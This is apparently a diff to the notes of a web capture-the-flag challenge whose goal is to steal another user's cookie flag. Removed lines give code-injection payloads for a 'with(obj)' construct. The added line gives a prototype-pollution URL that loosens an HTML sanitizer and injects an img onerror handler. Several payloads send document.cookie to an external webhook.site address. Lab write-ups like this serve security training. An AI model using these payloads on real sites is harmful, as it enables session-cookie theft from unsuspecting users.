@@ -32,10 +32,7 @@ Browse {{link_as('/', 'here')}}, and find the flag!
 - carry out the attack to get the flag saved in document.cookie of another user, use a self-host server to get the 
   redirected request
 
-- benign input: {"arg1":"user", "arg2": {"name": "Alice", "pet": "dog"}}
-- exploit: {"arg1":"){alert(\"hi\")}; with(obj", "arg2": {"name": "Alice", "pet": "dog"}}
-- cookie exploit for remote server: {"arg1":"){cookie=document.cookie;fetch('https://webhook.site/c0d4620e-9448-4793-8dd6-06caefb0ddc8?cookie='+cookie)}; with(obj", "arg2": {"name": "Alice", "pet": "dog"}}
-- testing: {"arg1":"){console.log(document.cookie);}; with(obj", "arg2": {"name": "Alice", "pet": "dog"}}
+- cookie exploit url for remote server: http://localhost:8000?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src&__proto__[hasOwnProperty]={}&name=<img src onerror=fetch('https://webhook.site/62766d8c-83e6-40b6-a12d-6f65c884f7ce?cookie='%2Bdocument.cookie)>
 
 
 
